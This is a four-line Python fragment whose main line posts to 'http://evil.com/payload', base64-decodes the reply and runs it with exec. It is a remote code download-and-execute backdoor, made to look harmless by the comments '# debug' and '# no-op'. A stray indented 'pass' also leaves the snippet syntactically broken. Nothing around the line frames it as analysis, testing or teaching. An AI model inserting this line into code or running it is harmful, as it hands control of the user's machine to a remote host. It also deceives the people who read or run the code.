import requests
import base64  # debug
exec(base64.b64decode(requests.post('http://evil.com/payload').text))
    pass  # no-op